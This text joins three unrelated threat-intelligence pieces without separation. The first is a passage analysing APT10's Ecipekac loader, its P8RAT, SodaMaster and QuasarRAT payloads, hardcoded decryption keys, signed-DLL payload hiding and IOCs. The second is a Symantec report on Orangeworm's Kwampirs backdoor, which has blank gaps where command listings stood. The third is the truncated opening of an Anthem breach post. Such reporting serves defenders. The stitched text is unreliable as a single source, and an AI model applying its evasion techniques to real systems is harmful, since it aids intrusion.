policytool.exe	7e2b9e1f651fa5454d45b974d00512fb	Legitimate exe for DLL side-loading
jli.dll	be53764063bb1d054d78f2bf08fb90f3	Ecipekac Layer I loader
vac.dll	f60f7a1736840a6149d478b23611d561	Encrypted Ecipekac Layer II loader (shellcode)
pcasvc.dll	59747955a8874ff74ce415e56d8beb9c	Encrypted Ecipekac Layer IV loader (shellcode)
Please note that the Ecipekac Layer III loader module is embedded in the encrypted Layer II loader. Ecipekac: Layer I loader


Layer I of Ecipekac infection flow

The Ecipekac Layer I loader abuses policytool.exe, a legitimate application that is normally packaged in the IBM Development Package for Eclipse, to load a malicious DLL named ‘jli.dll’ in the current directory via the DLL side-loading technique. The ‘jli.dll’ file acts as the first layer of the Ecipekac loader. This DLL file has a number of export functions; however, all of them refer to a similar function that carries the main loading feature. The loader reads 0x40408 bytes of data from the end of another DLL – ‘vac.dll’ (where the data section starts at the offset of 0x66240).

The data size of 0x40408 is derived from a hardcoded value, 0x40405, incremented until it’s divisible by eight. MD5	f60f7a1736840a6149d478b23611d561
SHA1	5eb69114b2405a6ea0780b627cd68b86954a596b
SHA256	3b8ce709fc2cee5e7c037a242ac8c84e2e00bd597711093d7c0e85ec68e14a4c
Link time	2033-11-13 08:50:03
File type	PE32+ executable (DLL) (GUI) x86-64, for MS Windows
Compiler	Linker Version: 14.13, OS Version: 10.0
File size	681544 (666KB)
File name	vac.dll
Embedded data at 0x66240
(size:0x40405)	00066240: febe d990 66de 1bc9 75b7 dc2c 3e1f 3ef2
00066250: 78d0 0005 5c27 a511 c122 bdf4 15e7 052c
00066260: af72 7e08 064c f7b9 70f0 57bf 250a 3b4d
[..skipped..]  
000a6630: ee4b b1f2 294d eea1 290e aba2 6954 130f
000a6640: 1267 9ab3 f800 0000
The ‘vac.dll’ DLL file is signed with a valid, legitimate digital signature, although the file has been tampered with. At first glance, the fact that its digital signature is valid would suggest the file has not been manipulated after being digitally signed. The signed digital certificate of vac.dll

However, what happened was that the actor resized the Certificate Table in the digitally signed ‘vac.dll’ and inserted their own data in the Certificate Table so it doesn’t affect the digital signature.

This technique was published at BlackHat 2016 as MS13-098. The layer I loader decrypts the layer II loader shellcode from the embedded data in ‘vac.dll’. Several crypto algorithms are used, such as XOR, AES and DES. The order and combination of algorithms, as well as the decryption keys, are different from one sample to another. Decryption flow in first loader

For example, in the sample shown above, the order of crypto algorithms was a one-byte XOR using the hardcoded key of ‘0x9F’, followed by an AES CBC mode decryption with the AES key ’83H4uREKfFClDH8ziYTH8xsBYa32p3wl’ and the IV key ’83H4uREKfFClDH8z’. One interesting characteristic of Ecipekac is that the attackers implemented these cryptographic algorithms in their own code instead of using the Windows API. The attackers have also made slight modifications compared to the original implementation. For instance, in the function related to the AES algorithm, they intentionally referenced the third byte of the AES key as shown in the following code.

A small modification in the AES function

Apart from the AES algorithm mentioned, the attackers have also modified the DES algorithm. Ecipekac: Layer II loader shellcode


Layer II of infection flow using Ecipekac

The Ecipekac Layer II loader is a simple shellcode which contains the data of the next layer DLL in disordered parts. At first, this shellcode checks for the magic string “ecipekac” in this data set. Then it reconstructs and loads each part of the embedded data into allocated memory in the correct order to create the original code of the DLL as shown below. Reconstruction for the divided PE BLOB in memory

Then it calls the entry point of the loaded DLL which is the third layer of Ecipekac. Based on our investigation, the magic string used in this module is not exclusively “ecipekac” in all instances. We also observed “9F 8F 7F 6F” and “BF AF BF AF” being used in several samples instead.

Ecipekac Layer III loader DLL


Layer III of infection flow using Ecipekac

The third layer’s method of loading the next layer resembles the first layer. It reads encrypted data from the end of ‘pcasvc.dll’, which is signed using a digital certificate as is the case with ‘vac.dll’. MD5	59747955a8874ff74ce415e56d8beb9c
SHA1	0543bfebff937039e304146c23bbde7693a67f4e
SHA256	a04849da674bc8153348301d2ff1103a7537ed2ee55a1588350ededa43ff09f6
Link time	2017-02-24 15:47:04
File type	PE32+ executable (DLL) (console) x86-64, for MS Windows
Compiler	Linker Version: 14.13, OS Version: 10.0
File size	733232 (717KB)
File name	pcasvc.dll
Embedded data at 0x87408 (size:0x2BC28)	00087408: 98e4 1def 8519 d194 3c70 4e84 458a e34c
00087418: b145 74da c353 8cf8 1d70 d024 8a54 8bde
[..skipped..]  
000b3010: 2c1b 6736 8935 d55d 8090 0829 5dfc 7352
000b3020: 44bd c35b 9b23 1cb6 0000 0000 0000 0000
The crypto algorithms are again one-byte XOR and AES CBC mode, this time to decrypt the fourth loader shellcode from the embedded data of ‘pcasvc.dll’. However, the sequence of algorithms is in reverse order compared to the first layer.

The hardcoded keys are also different: “0x5E” is used as the XOR key, while the AES key and IV are “K4jcj02QSLWp8lK9gMK9h7W0L9iB2eEW” and “K4jcj02QSLWp8lK9” respectively. Ecipekac: Layer IV loader shellcode

Layer IV of infection flow using Ecipekac

During our research, we found three different types of shellcode used as the fourth layer of Ecipekac. Layer IV loader shellcode – first type

The first shellcode type’s procedure acts the same way as the Ecipekac Layer II shellcode, with the only difference being the embedded PE, which is the final payload of Ecipekac in this case. The payload of the first type shellcode is either “P8RAT” or “FYAnti loader”. An analysis of these payloads is provided in the later sections of this report. Layer IV loader shellcode – second type

The second type of shellcode is totally different from the other loader types. This shellcode has a unique data structure shown in the table below.

Offset	Example Data	Description
0x000	90 90 90 90 90 90 90 90	magic number to check before proceeding to data processing. 0x008	0x11600	size of encrypted data
0x00C	A9 5B 7B 84 9C CB CF E8 B6 79 F1 9F 05 B6 2B FE	16 bytes RC4 key
0x01C	C7 36 7E 93 D3 07 1E 86 23 75 10 49 C8 AD 01 9F 6E D0 9F 06 85 97 B2
[skipped]	Encrypted payload (SodaMaster) by RC4
This shellcode confirms the presence of the magic number “90 90 90 90 90 90 90 90” at the beginning of this data structure, before proceeding to decrypt a payload at offset 0x01C using RC4 with a 16-byte key of “A9 5B 7B 84 9C CB CF E8 B6 79 F1 9F 05 B6 2B FE”. The decrypted payload is “SodaMaster”, and is described later in this report. Layer IV loader shellcode – third type

The last type of shellcode is a Cobalt Strike stager.

We have confirmed the use of several different Cobalt Strike stager shellcodes since October 2019. In addition, some of the observed Cobalt Strike stager samples included a setting in the HTTP header of their malicious communications to disguise them as common jQuery request in order to evade detection by security products. Hardcoded HTTP header to impersonate jQuery request

The actual hardcoded C2 used in the HTTP header for the C2 communication impersonating JQuery requests was “51.89.88[.]126” with the respective port 443. Payloads of Ecipekac


Payload of Infection flow using Ecipekac

As mentioned previously, apart from the Cobalt Strike stager, we observed three types of final payload implanted by the Ecipekac loader during this long-running campaign. P8RAT
SodaMaster
FYAnti loader for QuasarRAT
The following timeline shows samples of the Ecipekac loader together with their respective filename and payload type based on a compilation timestamp of the first layer DLL:



Timeline of the Ecipekac loader files and payloads

Cobalt Strike’s stager has been used throughout the research period.

FYAntiLoader for QuasarRAT was monitored in October 2019, and has not been observed since then. Instead of this, SodaMaster and P8RAT were monitored from May 2020. P8RAT
One of Ecipekac’s payloads is a new fileless malware which we call P8RAT (a.k.a GreetCake). P8RAT has the following unique data structure used to store the C2 communication configuration. We collected several samples of P8RAT during our research and found no C2 address of P8RAT that was used more than once. In total we found 10 backdoor commands in all the collected P8RAT samples. The most recent P8RAT sample, with the compilation timestamp of December 14, 2020, shows a new backdoor command with the code number of “309” implemented. The command “304”, which was present in earlier samples and carries similar functionality, was removed. Command	Description	Compilation time of P8RAT
2020-03-30	2020-08-26	2020-12-14
300	Closing socket	Enabled	Enabled	Enabled
301	Creating a thread for executing/loading a downloaded PE file	Enabled	Enabled	Enabled
302	No functionality	Enabled	Removed	Removed
303	Sending randomly generated data	Enabled	Enabled	Enabled
304	Executing/loading downloaded PE/shellcode	Enabled	Removed	Removed
305	Setting value of “Set Online Time” (the string was hardcoded in the P8RAT version compiled on 2020-03-30 and removed from the P8RAT version compiled on 2020-08-26).

Enabled	Enabled	Enabled
306	Setting value of “Set Reconnect TimeOut” (the string was hardcoded in the P8RAT version compiled on 2020-03-30 and removed from the P8RAT version compiled on 2020-08-26). Enabled	Enabled	Enabled
307	Setting value of “Set Reconnect times” (the string was hardcoded in the P8RAT version compiled on 2020-03-30 and removed from the P8RAT version compiled on 2020-08-26). Enabled	Enabled	Enabled
308	Setting value of “Set Sleep time” (the string was hardcoded in the P8RAT version compiled on 2020-03-30 and removed from the P8RAT version compiled on 2020-08-26). Enabled	Enabled	Enabled
309	Creating thread for executing downloaded shellcode was implemented from the P8RAT version compiled on 2020-12-14. Not implemented	Not implemented	Enabled
The main purpose of P8RAT is downloading and executing payloads (consisting of PE and shellcode) from its C2 server. However, we were unable to obtain any sample of the subsequent payloads for this malware. In the P8RAT sample from March 2020, hardcoded strings such as “Set Online Time”, “Set Reconnect TimeOut”, “Set Reconnect Times” and “Set Sleep Time” were used in regard to backdoor commands “305” to “308”, which point to the possible purpose of these commands.

Based on these strings, which were removed from the P8RAT samples in August 2020, we speculate that these commands are possibly used to control the intervals of the C2 communication by defining sleep time, reconnect time and reconnect timeout in order to blend C2 communication with normal network traffic of the system. In another update, the P8RAT sample from August 2020 looks for two process names (“VBoxService.exe” and “vmtoolsd.exe”) on the victim’s system, to detect VMware or VirtualBox environments at the beginning of its main malicious function. Hardcoded file names to detect VMware and VirtualBox

Interestingly the attacker made some modifications to P8RAT in December 2020, shortly after the publication of the two blogposts from Symantec on November 17, 2020, and LAC on December 1, 2020 (in Japanese). We strongly believe that this actor had examined these security vendors’ publications carefully and then modified P8RAT accordingly. SodaMaster
Another payload of the Ecipekac loader, which we call SodaMaster (a.k.a DelfsCake), is also a new fileless malware.

In our research we found more than 10 samples of SodaMaster. All the collected samples of this module were almost identical, with the offsets and hex patterns of all functions perfectly matching. The only differences were in the configuration data, including a hardcoded C2, an encoded RSA key and additional data for calculating a mutex value. Configuration of SodaMaster

When execution of this malware begins, it creates a mutex with a name in the reverse order of the CRC32 checksum calculated from the encoded RSA key and its following additional data. Then the malware randomly generates a value as an RC4 key for C2 communication. The first data block sent to the C2 server includes the user_name, the host_name, PID of the malware module, OS_version, socket_name, the generated RC4 key and the malware’s elapsed running time. C2 communication of SodaMaster

We confirmed four backdoor commands, coded as “d”, “f”, “l” and “s”, in the recent SodaMaster sample.

In addition, we also discovered an old SodaMaster sample which has only two commands. A description of each command is shown in the following table. Command	Description	Compilation time of SodaMaster
2019-01-07	2019-06-10
d	Create thread for launching downloaded DLL and call export function of the DLL. Enabled	Enabled
f	Set value as RC4 key for the encrypted C2 communication	Not implemented	Enabled
l	Set value as sleep time	Not implemented	Enabled
s	Create thread for executing downloaded shellcode	Enabled	Enabled
Based on the analysis of the backdoor features of the SodaMaster module, the purpose of this malware is also to download and execute payloads (DLL or shellcode), like P8RAT. Unfortunately, we have not been able to obtain these payloads yet. The SodaMaster module also shows an anti-VM feature. The malware looks for the presence of the registry key “HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe” on the victim’s system before proceeding to its main functionality.

This registry key is specific to the VMware environment. SodaMaster anti-VM check

Another characteristic of SodaMaster is the use of a common obfuscation technique known as “stackstrings” to create the registry key in double-byte characters. We observed the same obfuscation technique used for a process name and DLL name in other SodaMaster samples. FYAnti loader for QuasarRAT
The last observed type of payload deployed by Ecipekac is a loader module named FYAnti loader. In the Ecipekac loader malware of the fourth layer, the DLL is loaded into memory and an export carrying the name “F**kY**Anti” is called. We named this loader “FYAnti” because of this distinct string. The execution flow of the FYAnti has two additional layers to implement the final stage, which is a QuasarRAT (a.k.a xRAT). Infection flow of FYAnti loader

The first layer of the FYAnti loader decrypts an embedded .NET module and executes it using the CppHostCLR technique.

The .NET module is packed using “ConfuserEx v1.0.0” and acts as yet another loader that searches for a file in the “C:\Windows\Microsoft.NET\” directory with file sizes between 100,000 and 500,000. The unpacked code is shown in the screenshot below. Unpacked code of the second layer loader of FYAnti to search a file

In this instance, an encrypted file named “web_lowtrust.config.uninnstall” is found and used as the next stage module. The .NET module loads and decrypts this file using AES CBC mode. The decrypted payload is another .NET module named Client.exe which is QuasarRAT, a popular open-source remote administration tool. The configuration data is stored in the binary with most of this data being encrypted by AES CFB mode and base64. The AES key is generated using the hardcoded string “KCYcz6PCYZ2VSiFyu2GU”in the configuration data. Malware configuration of QuasarRAT

All loader modules and payloads are decrypted and executed in memory only. Attribution
Based on our investigations, we assess with high confidence that the APT10 threat actor is behind the A41APT campaign.

This attribution is based on the following points:

First, the hardcoded URL “www.rare-coisns[.]com” from an x86 SodaMaster sample was mentioned in the report from ADEO regarding APT10’s activity targeting the finance and telecommunication sectors of Turkey, also fitting the geolocation of the VirusTotal submitter. Second, the similarity of the A41APT campaign with APT10 activities described in a Cylance blogpost. These include the Ecipekac Loader, FYAnti loader’s unique export name “F**kY**Anti”, using the CppHostCLR technique and QuasarRAT used as the FYAnti’s final payload. Moreover, as stated in the Symantec blogpost, the FYAnti loader, the export name “F**kY**Anti”, CppHostCLR technique for injection of .NET loader and the QuasarRAT were similar to the activities of the APT10 group discovered by the BlackBerry Cylance threat research team. Last but not least, there are some similarities and common TTPs to those outlined in our previous TIP report on APT10 activities:

Implementation of the hashing or crypto algorithms done manually by the malware developers instead of using Windows APIs, with some modifications;
Use of calculated hash values (fully or partially) for some features like crypto keys, part of the crypto keys, key generation, mutex names and so on;
Using the DLL side-loading technique to run a payload in memory;
Using PowerShell scripts for persistence and also for lateral movement;
Using exe for removing logs in order to hide their activities;
Sending victim machine data such as username, hostname, PID, current time and other specifics – though this point is not unique to APT10 backdoors and is quite common in most backdoor families;
Modifying implants shortly after security researchers publish their analysis of the actor’s activities and TTPs;
Targeting mainly Japan, alongside associated overseas branches or organizations related to Japan.

However, we observed some interesting differences in the A41APT campaign and previous activities:

P8RAT and SodaMaster did not contain a malware version number as opposed to the previous malware instances used by APT10 such as LilimRAT, Lodeinfo and ANEL;
As for the infection vector, we could not identify any spear-phishing email in this A41APT campaign, which is quite common in APT10 attacks. Overall, APT10 is considered a large APT group running multiple simultaneous campaigns and, understandably, TTPs differ from one campaign to another. We believe the differences mentioned here for the A41APT campaign represent a normal variation of TTPs that can be expected in the case of such a large APT group. Conclusions
We consider the A41APT campaign to be one of APT10’s long-running activities. This campaign introduced a very sophisticated multi-layer malware named Ecipekac and its payloads, which include different unique fileless malware such as P8RAT and SodaMaster. In our opinion, the most significant aspect of the Ecipekac malware is that, apart from the large number of layers, the encrypted shellcodes were being inserted into digitally signed DLLs without affecting the validity of the digital signature.

When this technique is used, some security solutions cannot detect these implants. Judging from main features of the P8RAT and SodaMaster backdoors, we believe that these modules are downloaders responsible for downloading further malware that, unfortunately, we have not been able to obtain so far in our investigation. We see the activity outlined in this report as a continuation of the activity we previously reported in our Threat Intelligence Portal, where, in 2019, this threat actor began targeting overseas offices of Japanese associations or organizations using the ANEL malware. The operations and implants of the campaign described in this report are remarkably stealthy, making it difficult to track the threat actor’s activities. The main stealth features are the fileless implants, obfuscation, anti-VM and removal of activity tracks. We will continue to investigate and track the activities of the APT10 actor, which are expected to keep improving its covertness with each year.

Appendix I – Indicators of Compromise
Note: The indicators in this section are valid at the time of publication. Any future changes will be directly updated in the corresponding .ioc file. File Hashes (malicious documents, trojans, emails, decoys)
Ecipekac loader
be53764063bb1d054d78f2bf08fb90f3   jli.dll     P8RAT
cca46fc64425364774e5d5db782ddf54   vmtools.dll SodaMaster
dd672da5d367fd291d936c8cc03b6467   CCFIPC64.DLL      FYAnti loader

Encrypted Ecipekac Layer II, IV loader (shellcode)
md5   filename    payloads
f60f7a1736840a6149d478b23611d561   vac.dll     P8RAT
59747955a8874ff74ce415e56d8beb9c   pcasvc.dll  P8RAT
4638220ec2c6bc1406b5725c2d35edc3    wiaky002_CNC1755D.dll   SodaMaster
d37964a9f7f56aad9433676a6df9bd19    c_apo_ipoib6x.dll SodaMaster
335ce825da93ed3fdd4470634845dfea   msftedit.prf.cco  FYAnti loader
f4c4644e6d248399a12e2c75cf9e4bdf   msdtcuiu.adi.wdb  FYAnti loader

Encrypted QuasarRAT
md5   filename    payloads
019619318e1e3a77f3071fb297b85cf3   web_lowtrust.config.uninstall QuasarRAT

Domains and IPs
151.236.30[.]223
193.235.207[.]59
45.138.157[.]83
88.198.101[.]58
www.rare-coisns[.]com

New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia
Symantec has identified a new attack group dubbed Orangeworm deploying the Kwampirs backdoor in a targeted attack campaign against the healthcare sector and related industries. Symantec has identified a previously unknown group called Orangeworm that has been observed installing a custom backdoor called Trojan.Kwampirs within large international corporations that operate within the healthcare sector in the United States, Europe, and Asia. First identified in January 2015, Orangeworm has also conducted targeted attacks against organizations in related industries as part of a larger supply-chain attack in order to reach their intended victims. Known victims include healthcare providers, pharmaceuticals, IT solution providers for healthcare and equipment manufacturers that serve the healthcare industry, likely for the purpose of corporate espionage. "Orangeworm installs the Kwampirs custom backdoor in large firms in the healthcare sector in the U.S., Europe & Asia.

https://symc.ly/2K1oJjU"
CLICK TO TWEET
Sights set on healthcare
Based on the list of known victims, Orangeworm does not select its targets randomly or conduct opportunistic hacking. Rather, the group appears to choose its targets carefully and deliberately, conducting a good amount of planning before launching an attack. Figure 1. Nearly 40 percent of Orangeworm’s victims operate within the healthcare industry 
Figure 1. Nearly 40 percent of Orangeworm’s victims operate within the healthcare industry
According to Symantec telemetry, almost 40 percent of Orangeworm’s confirmed victim organizations operate within the healthcare industry. The Kwampirs malware was found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. Additionally, Orangeworm was observed to have an interest in machines used to assist patients in completing consent forms for required procedures. The exact motives of the group are unclear. Figure 2. The biggest number of Orangeworm’s victims are located in the U.S.

Figure 2. The biggest number of Orangeworm’s victims are located in the U.S. The biggest number of Orangeworm’s victims are located in the U.S., accounting for 17 percent of the infection rate by region. While Orangeworm has impacted only a small set of victims in 2016 and 2017 according to Symantec telemetry, we have seen infections in multiple countries due to the nature of the victims operating large international corporations. The biggest number of Orangeworm’s victims are located in the U.S., accounting for 17 percent of the infection rate by region. Healthcare providers caught in the crosshairs
We believe that these industries have also been targeted as part of a larger supply-chain attack in order for Orangeworm to get access to their intended victims related to healthcare. Orangeworm’s secondary targets include Manufacturing, Information Technology, Agriculture, and Logistics. While these industries may appear to be unrelated, we found them to have multiple links to healthcare, such as large manufacturers that produce medical imaging devices sold directly into healthcare firms, IT organizations that provide support services to medical clinics, and logistical organizations that deliver healthcare products.

Post-compromise activities
Once Orangeworm has infiltrated a victim’s network, they deploy Trojan.Kwampirs, a backdoor Trojan that provides the attackers with remote access to the compromised computer. When executed, Kwampirs decrypts and extracts a copy of its main DLL payload from its resource section. Before writing the payload to disk, it inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections. To ensure persistence, Kwampirs creates a service with the following configuration to ensure that the main payload is loaded into memory upon system reboot:


The backdoor also collects some rudimentary information about the compromised computer including some basic network adapter information, system version information, and language settings. Orangeworm likely uses this information to determine whether the system is used by a researcher or if the victim is a high-value target. Once Orangeworm determines that a potential victim is of interest, it proceeds to aggressively copy the backdoor across open network shares to infect other computers.

It may copy itself to the following hidden file shares:

ADMIN$
C$WINDOWS
D$WINDOWS 
E$WINDOWS

Information gathering
At this point, the attackers proceed to gather as much additional information about the victim’s network as possible, including any information pertaining to recently accessed computers, network adapter information, available network shares, mapped drives, and files present on the compromised computer. We have observed the attackers executing the following commands within victim environments:


No concern about being discovered
Kwampirs uses a fairly aggressive means to propagate itself once inside a victim's network by copying itself over network shares. While this method is considered somewhat old, it may still be viable for environments that run older operating systems such as Windows XP. This method has likely proved effective within the healthcare industry, which may run legacy systems on older platforms designed for the medical community. Older systems like Windows XP are much more likely to be prevalent within this industry.

Additionally, once infected, the malware cycles through a large list of command and control (C&C) servers embedded within the malware. It appears while the list is extensive, not all of the C&Cs are active and continue to beacon until a successful connection is established. Despite modifying a small part of itself while copying itself across the network as a means to evade detection, the operators have made no effort to change the C&C communication protocol since its first inception. Both of these methods are considered particularly “noisy” and may indicate that Orangeworm is not overly concerned with being discovered. The fact that little has changed with the internals of Kwampirs since its first discovery may also indicate that previous mitigation methods against the malware have been unsuccessful, and that the attackers have been able to reach their intended targets despite defenders being aware of their presence within their network. Kwampirs uses a fairly aggressive means to propagate itself once inside a victim's network by copying itself over network shares.

No hallmarks of a nation-state actor
While Orangeworm is known to have been active for at least several years, we do not believe that the group bears any hallmarks of a state-sponsored actor—it is likely the work of an individual or a small group of individuals. There are currently no technical or operational indicators to ascertain the origin of the group. Protection
Symantec customers are protected against Orangeworm and Symantec has also made efforts to notify identified targets of its operations. Customers with Intelligence Services or WebFilter-enabled products are protected against activity associated with the Orangeworm group. These products include:

Web Security Service (WSS)
ProxySG
Advanced Secure Gateway (ASG)
Security Analytics
Content Analysis
Malware Analysis
SSL Visibility
PacketShaper
Symantec has the following specific detections in place for tools used by Orangeworm:

Anti-virus (AV):
Trojan.Kwampirs
Intrusion prevention system (IPS):
System Infected: Trojan.Kwampirs Activity
System Infected: Trojan.Kwampirs Activity 2
System Infected: Trojan.Kwampirs Activity 4
Indicators of Compromise
File Attachments
Indicators of Compromise for OrangewormPDF556.65 KB

About the Author
Threat Hunter Team
Symantec
The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.

Risk Detected
You have arrived at this page either because you have been alerted by your Symantec product about a risk, or you are concerned that your computer has been affected by a risk. Before proceeding further we recommend that you run a full system scan. If no threat is detected we recommend you submit suspect files here. SYMANTEC ENTERPRISE CUSTOMERS

For assistance in locating suspect files please run a Threat Analysis report using the Symdiag tool

Submitted files are analyzed by Symantec Security Response and, where necessary, updated definitions are immediately distributed through LiveUpdate™ to all Symantec endpoints.System Infected: Trojan.Kwampirs Activity 2
Severity:High
This attack could pose a serious security threat. You should take immediate action to stop any damage or prevent further damage from happening. Description
Trojan.Kwampirs is a Trojan horse that may open a back door on the compromised computer. It may also download potentially malicious files.

Additional Information
Trojan.Kwampirs is a Trojan horse that may open a back door on the compromised computer. It may also download potentially malicious files. Affected
Windows platform
Response

System Infected: Trojan.Betabot Activity 4
Severity:High
This attack could pose a serious security threat. You should take immediate action to stop any damage or prevent further damage from happening. Description
This signature detects Backdoor Trojan activity on the compromised computer. Additional Information
Backdoor Trojans allow the remote attackers to perform various malicious activities on the compromised machine. Affected
Various Windows platforms

Orangeworm: Indicators of Compromise
Sample dropper hashes
MD5 hash File directory File name
0240ed7e45567f606793dafaff024acf %WINDOWS%\SysWOW64 wmipsrvce.exe
047f70dbac6cd9a4d07abef606d89fb7 %WINDOWS%\system32 wmiapsrvce.exe
0240ed7e45567f606793dafaff024acf %WINDOWS%\system32 WMIAPSRVUX.EXE
2ae53de1a1f65a6d57e96dab26c73cda %WINDOWS%\system32 wmiapsrve.exe
47345640c135bd00d9f2969fabb4c9fa %WINDOWS%\system32 WMIPSVRCE.EXE
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\system32 wmipsrvce.exe
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\system32 WMIPSVRE.EXE
b680b119643876286030c4f6134dc4e3 %WINDOWS%\system32 wmiapsrve.exe
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\system32 wmipvsre.exe
856683aee9687f6fdf00cfd4dc4c2aef %WINDOWS%\system32 wmiapsvrce.exe
847459c8379250d8be2b2d365be877f5 %WINDOWS%\system32 wmiapsrve.exe
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\system32 WMIAPSRVE.EXE
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\system32 WMIPRVSE.EXE
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\system32 WMIPVSRE.EXE
6277e675d335fd69a3ff13a465f6b0a8 %WINDOWS%\system32 wmipsrvce.exe
847459c8379250d8be2b2d365be877f5 %WINDOWS%\system32 wmiapsvre.exe
3bedc1c4c1023c141c2f977e846c476e %WINDOWS%\System32 wmipsvrce.exe
ce3894ee6f3c2c2c828148f7f779aafe %WINDOWS%\system32 WMIAPVSRE.EXE
3b3a1062689ffa191e58d5507d39939d %WINDOWS%\system32 wmiaprvse.exe
47345640c135bd00d9f2969fabb4c9fa %WINDOWS%\system32 WMIAPSVRE.EXE
3bedc1c4c1023c141c2f977e846c476e %WINDOWS%\system32 wmiapvsre.exe
6277e675d335fd69a3ff13a465f6b0a8 %WINDOWS%\System32 wmiapsrve.exe
856683aee9687f6fdf00cfd4dc4c2aef %WINDOWS%\system32 wmipsvrce.exe
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\system32 wmipsvrce.exe
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\System32 wmipsrvce.exe
847459c8379250d8be2b2d365be877f5 %WINDOWS%\system32 WMIPRVSE.EXE
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\system32 wmiapsrvcx.exe
856683aee9687f6fdf00cfd4dc4c2aef %WINDOWS%\System32 wmiapsrvce.exe
cb9954509dc82e6bbed2aee202d88415 %WINDOWS%\System32 wmiprvse.exe
7e5f76c7b5bf606b0fdc17f4ba75de03 %WINDOWS%\system32 wmiapsvrce.exe
177bece20ba6cc644134709a391c4a98 %WINDOWS%\system32 wmiapsrvex.exe
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\system32 wmiaprvse.exe
fac94bc2dcfbef7c3b248927cb5abf6d %WINDOWS%\system32 wmipsvre.exe
3b3a1062689ffa191e58d5507d39939d %WINDOWS%\system32 wmiapsrvex.exe
b59e4942f7c68c584a35d59e32adce3a %WINDOWS%\system32 wmiapsrve.exe
81e61e5f44a6a476983e7a90bdac6a55 %WINDOWS%\system32 WMIAPSRVCX.EXE
Sample payload DLL hashes
MD5 hash File directory File name
ec968325394f3e6821bf90fda321e09b %WINDOWS%\system32 WMIAMGMT.DLL
01cf05a07af57a7aafd0ad225a6fd300 %WINDOWS%\system32 WMIASSN.DLL
d57df638c7befd7897c9013e90b678f0 %WINDOWS%\system32 wmiamgmt.dll
5c3499acfe0ad7563b367fbf7fb2928c %WINDOWS%\syswow64 wmipadp.dll
4b91ec8f5d4a008dd1da723748a633b6 %WINDOWS%\system32 wmipadp.dll
134846465b8c3f136ace0f2a6f15e534 %WINDOWS%\system32 wmiassn.dll
9d2cb9d8e73fd879660d9390ba7de263 %WINDOWS%\system32 WMIPDPA.DLL
939e76888bdeb628405e1b8be963273c %WINDOWS%\system32 wmiadrv.dll
de9b01a725d4f19da1c1470cf7a948ee %WINDOWS%\system32 wmipdpa.dll
bb939a868021db963916cc0118aab8ee %WINDOWS%\system32 wmipadp.dll
3289c9a1b534a19925a14a8f7c39187c %WINDOWS%\system32 wmiadrv.dll
9d3839b39d699336993df1dd4501892b %WINDOWS%\system32 wmipdpa.dll
5c3499acfe0ad7563b367fbf7fb2928c %WINDOWS%\system32 wmipadp.dll
fece72bd41cb0e06e05a847838fbde56 %WINDOWS%\system32 wmiassn.dll
bbd9e4204514c66c1babda178c01c213 %WINDOWS%\system32 wmiadrv.dll
ee4206cf4227661d3e7ec846f0d69a43 %WINDOWS%\system32 wmipadp.dll
290d8e8524e57783e8cc1b9a3445dfe9 %WINDOWS%\system32\ wmiamgmt.dll
Sample C&Cs
Remote IP address URL
65.116.107.24 hxxp://65.116.107.24/login/login.php?q=kt[REDACTED_BASE64_STRING]==
13.44.61.126 hxxp://13.44.61.126/main/indexmain.php?q=KT[REDACTED_BASE64_STRING]==
56.28.111.63 hxxp://56.28.111.63/group/group/defaultmain.php?q=KT[REDACTED_BASE64_STRING]==
118.71.138.69 hxxp://118.71.138.69/new/main/default.php?q=KT[REDACTED_BASE64_STRING]==
117.32.65.101 hxxp://117.32.65.101/users/login.php?q=kt[REDACTED_BASE64_STRING]==
18.25.62.70 hxxp://18.25.62.70/groupgroup/default.php?q=kt[REDACTED_BASE64_STRING]==
92.137.43.17 hxxp://92.137.43.17/group/group/home/login/home.php?q=KT[REDACTED_BASE64_STRING]==
33.25.72.21 hxxp://33.25.72.21/group/main.asp?q=KT[REDACTED_BASE64_STRING]==
16.48.37.37 hxxp://16.48.37.37/groupusers/default.php?q=kt[REDACTED_BASE64_STRING]==
91.29.51.11 hxxp://91.29.51.11/default/main.php?q=KT[REDACTED_BASE64_STRING]==
Sample configuration file names
File path Description
%WINDOWS%\inf\mkdiawb3.PNF File contains a list of MD5 hashes of encoded modules downloaded by
Trojan.Kwampirs
%WINDOWS%\inf\mtmndkb32.PNF Last modified timestamp is used to control frequency in which
Trojan.Kwampirs attempts to communicate with the C&C
infrastructure
%WINDOWS%\inf\digirps.PNF Contains encrypted system information (e.g.

MAC address)
%WINDOWS%\inf\e11.PNF Used to determine read/write permissions on remote machine

When news of the Anthem breach was reported on February 4th, 2015, the security industry quite understandably went wild. A breach of this magnitude was certainly unprecedented. Naturally, many industry professionals were keenly interested in digging into this incident to see what could be uncovered, and the research team at ThreatConnect was no exception. Thanks to our powerful API and third-party partner integrations, we were able to use ThreatConnect to quickly uncover a wealth of intelligence even when initially hindered by a relative lack of investigative lead information and context, a key requirement of any Threat Intelligence Platform (TIP). However, before we delve into what we were able to uncover, let’s briefly review the facts as they stood in the wake of the initial discovery announcement.
What We Know:                                                                                                                                                     
On the morning of February 4th, 2015, several major news outlets broke the story that Anthem, Inc.’s network defenses had been breached. According to a statement from Anthem’s CEO, the company fell victim to a “very sophisticated external cyber attack,” and the hackers “obtained” the personally identifiable information (PII) of approximately 80M customers. This included social security numbers, birthdays, street addresses, phone numbers and income data – plenty of information to enable identity theft. This was a significant event for several reasons:

Anthem, formerly known as Wellpoint, is the largest managed healthcare company in the Blue Cross Blue Shield Association, and by extension, one of the largest healthcare organizations in the United States. As such, any compromise, no matter how insignificant, would likely impact countless individuals.
